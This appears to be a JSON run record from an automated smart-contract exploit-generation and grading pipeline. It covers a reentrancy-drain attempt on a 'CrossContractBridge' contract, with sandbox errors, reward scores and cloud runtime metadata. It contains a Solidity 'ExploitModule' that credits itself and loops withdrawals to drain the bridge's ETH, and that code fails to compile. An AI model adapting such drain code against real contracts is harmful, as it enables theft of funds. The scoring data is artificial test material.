@@ -1,0 +1,191 @@
+{
+  "absence_records": [
+    {
+      "field": "app_id",
+      "kind": "PROVIDER_FIELD_OMITTED",
+      "reason": "Modal SDK 1.5.5 exposes no running-app accessor to a function container: modal.running_app is a module and not a callable, and the runtime-context API (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) carries no application id. The application id of this run is a client-side fact of the provider-issued App.app_id of the running app."
+    },
+    {
+      "field": "container_id",
+      "kind": "PROVIDER_FIELD_OMITTED",
+      "reason": "a Modal function container has no supported source of a provider-issued container id: the public runtime API of Modal SDK 1.5.5 (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) reports no container id, MODAL_WORKER_ID is the SDK's 'worker_id' configuration setting (documented in the SDK source as internal debugging use) and not a provider-issued identifier, HOSTNAME is a generic container hostname, and MODAL_TASK_ID is read only by the internal, experimental module modal/experimental/flash.py. The provider-issued container id of this invocation is a client-side fact: the client resolves the function-call id this worker observed through the provider's own call graph and container listing."
+    }
+  ],
+  "attempted": true,
+  "correlation_id": "corr-BRIDGE-01-1795027737-167632b2",
+  "executed": true,
+  "provider_response": {
+    "breach_evidence_basis": "none",
+    "candidate_id": "69b4a0d0",
+    "candidate_index": 0,
+    "category": "COMPILATION_ERROR",
+    "evidence": null,
+    "failure_reason": null,
+    "feedback": "Execution Failed (exit code 1): Compilation Error: Error: Compiler run failed:\nWarning (9302): Return value of low-level calls not used.\n  --> test/ExploitModule.sol:15:9:\n   |\n15 |         payable(address(targetContract)).call{value: address(this).balance}(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nError (9553): Invalid type for argument in function | reward_spec=2.0.0 total=-0.50 penalty=-0.55 [generation=+0.05, compilation=+0.00, verification=+0.00, invariant=+0.00, replay=+0.00]",
+    "generation_iteration": 0,
+    "invariant_results": [],
+    "is_verified": false,
+    "modal_runtime": {
+      "app_id": {
+        "observed_by": "worker",
+        "reason": "Modal SDK 1.5.5 exposes no running-app accessor to a function container: modal.running_app is a module and not a callable, and the runtime-context API (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) carries no application id. The application id of this run is a client-side fact of the provider-issued App.app_id of the running app.",
+        "status": "NOT_AVAILABLE",
+        "value": null
+      },
+      "app_page_url": {
+        "observed_by": "worker",
+        "reason": "the Modal runtime exposes no app page URL to a function container: the only candidate inside the container was modal.running_app, which is a module and not a callable in Modal SDK 1.5.5, while the supported App.get_dashboard_url() is a client-side API of the SDK. The app page URL of this run is a client-side fact of the provider.",
+        "status": "NOT_AVAILABLE",
+        "value": null
+      },
+      "container_id": {
+        "observed_by": "worker",
+        "reason": "a Modal function container has no supported source of a provider-issued container id: the public runtime API of Modal SDK 1.5.5 (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) reports no container id, MODAL_WORKER_ID is the SDK's 'worker_id' configuration setting (documented in the SDK source as internal debugging use) and not a provider-issued identifier, HOSTNAME is a generic container hostname, and MODAL_TASK_ID is read only by the internal, experimental module modal/experimental/flash.py. The provider-issued container id of this invocation is a client-side fact: the client resolves the function-call id this worker observed through the provider's own call graph and container listing.",
+        "status": "NOT_AVAILABLE",
+        "value": null
+      },
+      "container_id_value": null,
+      "function_call_id": {
+        "observed_by": "worker",
+        "source": "modal.current_function_call_id()",
+        "status": "OBSERVED",
+        "value": "fc-01M7QZVZ7DSJ9WNPD420Q8CBMG"
+      }
+    },
+    "observed_environment": {
+      "compiler_settings": {
+        "source": "forge config --json",
+        "status": "OBSERVED",
+        "value": {
+          "evm_version": "shanghai",
+          "offline": true,
+          "optimizer": true,
+          "optimizer_runs": 200,
+          "via_ir": false
+        }
+      },
+      "exact_forge_argv": {
+        "source": "the argv that was executed",
+        "status": "OBSERVED",
+        "value": [
+          "forge",
+          "test",
+          "--offline",
+          "--json",
+          "-vvvv"
+        ]
+      },
+      "forge_version": {
+        "source": "forge --version",
+        "status": "OBSERVED",
+        "value": "forge Version: 1.9.0\nCommit SHA: 6056c5845d34205a83cf7108042adb137325c9df\nBuild Timestamp: 2026-11-02T20:28:32.434285913Z (1793651312)\nBuild Profile: dist"
+      },
+      "image_digest": {
+        "source": "modal.config.image_id",
+        "status": "OBSERVED",
+        "value": "im-gxpn3m11BHx6O1BAyL8LH8"
+      },
+      "observed_exit_code": {
+        "source": "the exit code of the forge process",
+        "status": "OBSERVED",
+        "value": 1
+      },
+      "remote_os": {
+        "source": "/etc/os-release:PRETTY_NAME",
+        "status": "OBSERVED",
+        "value": "Debian GNU/Linux 12 (bookworm)"
+      },
+      "remote_platform": {
+        "source": "os.name",
+        "status": "OBSERVED",
+        "value": "posix"
+      },
+      "solc_versions": {
+        "source": "forge config --json:solc",
+        "status": "OBSERVED",
+        "value": [
+          "0.8.20"
+        ]
+      },
+      "working_directory": {
+        "source": "the cwd of the forge process",
+        "status": "OBSERVED",
+        "value": "/tmp/tmpwcjjyaea"
+      }
+    },
+    "poc_code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {CrossContractBridge} from \"../src/CrossContractBridge.sol\";\n\ncontract ExploitModule {\n    CrossContractBridge public targetContract;\n\n    constructor(address _target) payable {\n        targetContract = CrossContractBridge(payable(_target));\n    }\n\n    function runExploit() external payable {\n        // First, we deposit some ETH into the bridge contract\n        payable(address(targetContract)).call{value: address(this).balance}(\"\");\n        \n        // Then we add some credit to ourselves in the ledger\n        targetContract.ledger().addCredit(address(this), address(this).balance);\n        \n        // Now we can release the tokens multiple times without reducing our credit\n        // This drains the bridge contract until it has less than 1 ether left\n        while (address(targetContract).balance >= 1 ether) {\n            targetContract.releaseBridgedTokens(address(this), 1 ether);\n        }\n    }\n\n    receive() external payable {}\n}",
+    "refinement_iteration": 99,
+    "replay_confirmed": false,
+    "replay_status": "NOT_ELIGIBLE",
+    "reproducible": false,
+    "reward_components": {
+      "compilation": 0.0,
+      "generation": 0.05,
+      "invariant": 0.0,
+      "replay": 0.0,
+      "verification": 0.0
+    },
+    "reward_penalty": -0.55,
+    "reward_score": -0.5,
+    "reward_spec_version": "2.0.0",
+    "run_id": "run-default",
+    "sandbox_returncode": 1,
+    "sandbox_stderr": "Error: Compiler run failed:\nWarning (9302): Return value of low-level calls not used.\n  --> test/ExploitModule.sol:15:9:\n   |\n15 |         payable(address(targetContract)).call{value: address(this).balance}(\"\");\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nError (9553): Invalid type for argument in function call. Invalid implicit conversion from address to address payable requested.\n  --> test/ExploitModule.sol:23:49:\n   |\n23 |             targetContract.releaseBridgedTokens(address(this), 1 ether);\n   |                                                 ^^^^^^^^^^^^^\n",
+    "sandbox_stderr_byte_length": 613,
+    "sandbox_stderr_bytes_b64": "RXJyb3I6IENvbXBpbGVyIHJ1biBmYWlsZWQ6Cldhcm5pbmcgKDkzMDIpOiBSZXR1cm4gdmFsdWUgb2YgbG93LWxldmVsIGNhbGxzIG5vdCB1c2VkLgogIC0tPiB0ZXN0L0V4cGxvaXRNb2R1bGUuc29sOjE1Ojk6CiAgIHwKMTUgfCAgICAgICAgIHBheWFibGUoYWRkcmVzcyh0YXJnZXRDb250cmFjdCkpLmNhbGx7dmFsdWU6IGFkZHJlc3ModGhpcykuYmFsYW5jZX0oIiIpOwogICB8ICAgICAgICAgXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl5eXl4KCkVycm9yICg5NTUzKTogSW52YWxpZCB0eXBlIGZvciBhcmd1bWVudCBpbiBmdW5jdGlvbiBjYWxsLiBJbnZhbGlkIGltcGxpY2l0IGNvbnZlcnNpb24gZnJvbSBhZGRyZXNzIHRvIGFkZHJlc3MgcGF5YWJsZSByZXF1ZXN0ZWQuCiAgLS0+IHRlc3QvRXhwbG9pdE1vZHVsZS5zb2w6MjM6NDk6CiAgIHwKMjMgfCAgICAgICAgICAgICB0YXJnZXRDb250cmFjdC5yZWxlYXNlQnJpZGdlZFRva2VucyhhZGRyZXNzKHRoaXMpLCAxIGV0aGVyKTsKICAgfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBeXl5eXl5eXl5eXl5eCg==",
+    "sandbox_stderr_sha256": "3600e5c7e9831af66d055ae1686afc7c5cfcb86682ea1d09454d32f42b604633",
+    "sandbox_stdout": "",
+    "sandbox_stdout_byte_length": 0,
+    "sandbox_stdout_bytes_b64": "",
+    "sandbox_stdout_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "state_delta_verified": false,
+    "target_name": "CrossContractBridge",
+    "verification_result": null,
+    "vulnerability_type": "ReentrancyDrain"
+  },
+  "provider_response_metadata": {
+    "response_byte_length": 7142,
+    "response_sha256": "aac8f8e3a07db978804855bedf95d34f76950335ec6233d8b1de118bee646e60",
+    "response_source": "the response of verify_exploit_remote",
+    "runtime_identity_byte_length": 1879,
+    "runtime_identity_sha256": "b7d82de1f1719adcd5e4413c2fabe99ef3e6d3003ba82fab86de07675c222942"
+  },
+  "requested_fields": [
+    "app_id",
+    "function_call_id",
+    "container_id"
+  ],
+  "response_received": true,
+  "runtime_envelope_received": true,
+  "runtime_identity": {
+    "app_id": {
+      "observed_by": "worker",
+      "reason": "Modal SDK 1.5.5 exposes no running-app accessor to a function container: modal.running_app is a module and not a callable, and the runtime-context API (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) carries no application id. The application id of this run is a client-side fact of the provider-issued App.app_id of the running app.",
+      "status": "NOT_AVAILABLE",
+      "value": null
+    },
+    "app_page_url": {
+      "observed_by": "worker",
+      "reason": "the Modal runtime exposes no app page URL to a function container: the only candidate inside the container was modal.running_app, which is a module and not a callable in Modal SDK 1.5.5, while the supported App.get_dashboard_url() is a client-side API of the SDK. The app page URL of this run is a client-side fact of the provider.",
+      "status": "NOT_AVAILABLE",
+      "value": null
+    },
+    "container_id": {
+      "observed_by": "worker",
+      "reason": "a Modal function container has no supported source of a provider-issued container id: the public runtime API of Modal SDK 1.5.5 (modal.current_function_call_id, modal.current_input_id, modal.interact, modal.is_local) reports no container id, MODAL_WORKER_ID is the SDK's 'worker_id' configuration setting (documented in the SDK source as internal debugging use) and not a provider-issued identifier, HOSTNAME is a generic container hostname, and MODAL_TASK_ID is read only by the internal, experimental module modal/experimental/flash.py. The provider-issued container id of this invocation is a client-side fact: the client resolves the function-call id this worker observed through the provider's own call graph and container listing.",
+      "status": "NOT_AVAILABLE",
+      "value": null
+    },
+    "container_id_value": null,
+    "function_call_id": {
+      "observed_by": "worker",
+      "source": "modal.current_function_call_id()",
+      "status": "OBSERVED",
+      "value": "fc-01M7QZVZ7DSJ9WNPD420Q8CBMG"
+    }
+  },
+  "runtime_identity_source": "modal_runtime",
+  "schema_version": "1.0.0",
+  "stage": "evm_sandbox",
+  "target_id": "BRIDGE-01"
+}
